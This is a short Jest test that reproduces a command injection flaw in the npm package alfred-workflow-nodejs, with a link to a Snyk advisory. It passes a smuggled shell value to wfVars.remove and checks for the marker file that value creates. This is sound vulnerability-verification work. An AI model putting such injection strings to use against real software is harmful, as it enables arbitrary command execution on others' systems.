//https://snyk.io/vuln/SNYK-JS-ALFREDWORKFLOWNODEJS-608975
test("Command Injection in killing", () => {
  const AlfredNode = require("alfred-workflow-nodejs");
  const fs = require("fs");
  const path = "./alfred-workflow-nodejs";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var utils = AlfredNode.utils;
  utils.wfVars.remove(' "; touch alfred-workflow-nodejs #', false);
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
